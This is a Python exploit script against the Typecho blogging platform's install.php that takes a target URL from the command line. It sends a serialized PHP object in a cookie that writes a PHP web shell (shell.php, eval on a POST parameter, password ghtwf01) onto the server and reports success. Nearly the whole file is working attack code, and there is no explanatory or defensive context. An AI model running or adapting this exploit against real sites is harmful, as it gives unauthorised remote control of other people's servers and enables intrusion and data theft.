import requests
import optparse

def exp(url):
    if "http//" or "https://" in url:
        url = url
    else:
        url = 'http://' + url

    target = url + '/install.php?finish=a'
    payload = "__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6Njc6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtnaHR3ZjAxXSk7ID8%2BIikiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30%3D"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
        'Referer': url,
        'cookie': payload
    }

    try:
        html = requests.get(url=target, headers=headers, timeout=5)
        if html.status_code == 404:
            return 'install.php is not exist'
        else:
            print('[+]Successfully write to file ./shell.php, password=ghtwf01')
    except:
        print('[-]something wrong')

if __name__ == '__main__':
    parser = optparse.OptionParser("-u <target url>")
    parser.add_option('-u', dest='host', type='string', help='目标地址')
    (options, args) = parser.parse_args()
    url = options.host
    exp(url)

